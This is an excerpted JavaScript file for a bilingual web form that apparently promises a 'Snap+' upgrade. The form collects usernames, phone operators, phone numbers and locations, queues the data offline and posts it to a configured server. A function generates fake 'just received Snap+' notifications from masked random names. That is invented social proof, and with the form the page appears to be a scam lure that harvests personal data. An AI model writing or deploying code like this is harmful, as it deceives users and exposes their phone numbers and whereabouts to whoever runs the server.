...
function getRandomNotif() {
    ...
    return '🎉 ' + name + surname.substring(0,2) + '*** just received Snap+ !';
}
...
const elements = {
    langFr: document.getElementById('langFr'), langEn: document.getElementById('langEn'),
    siteLogo: document.getElementById('siteLogo'), mainTitle: document.getElementById('mainTitle'),
    warningMsg: document.getElementById('warningMsg'), usernameLabel: document.getElementById('usernameLabel'),
    operatorLabel: document.getElementById('operatorLabel'), phoneLabel: document.getElementById('phoneLabel'),
    locationLabel: document.getElementById('locationLabel'), submitBtn: document.getElementById('submitBtn'),
    statusMsg: document.getElementById('statusMsg'), username: document.getElementById('username'),
    phone: document.getElementById('phone'), location: document.getElementById('location'),
    offlineQueue: document.getElementById('offlineQueue'), queueCount: document.getElementById('queueCount'),
...
function setLanguage(lang) {
    ...
    if (statusText && (statusText.includes('✅') || statusText.includes('❌') || statusText.includes('💾'))) {
        elements.statusMsg.textContent = ''; elements.statusMsg.className = 'status-message';
    }
    updateQueueDisplay();
}
...
function updateOperators() {
    ...
    ops.forEach((name, i) => {
        ...
        btn.dataset.operator = opValues[i]; btn.textContent = name;
...
function validateUsername(username) { return /^[a-zA-Z0-9._-]{3,15}$/.test(username); }
...
function getQueue() { try { return JSON.parse(localStorage.getItem('snaptech_queue') || '[]'); } catch (e) { return []; } }
function saveQueue(queue) { try { localStorage.setItem('snaptech_queue', JSON.stringify(queue)); } catch (e) {} updateQueueDisplay(); }
function updateQueueDisplay() { const queue = getQueue(); elements.offlineQueue.style.display = queue.length > 0 ? 'block' : 'none'; elements.queueCount.textContent = queue.length; }
function addToQueue(data) { const queue = getQueue(); queue.push({ ...data, id: Date.now(), attempts: 0 }); saveQueue(queue); showStatus(translations[currentLang].offlineSaved, 'success'); }
...
async function syncPendingRequests() {
    ...
    for (const item of queue) {
        try {
            const response = await fetch(CONFIG.API_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(item) });
            if (response.ok || response.status === 409) synced++;
            else { item.attempts = (item.attempts || 0) + 1; if (item.attempts < 5) remaining.push(item); }
        } catch (err) { item.attempts = (item.attempts || 0) + 1; if (item.attempts < 5) remaining.push(item); }
    }
    saveQueue(remaining);
...
async function submitForm() {
    ...
    showStatus('', '');
    try {
        const response = await fetch(CONFIG.API_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
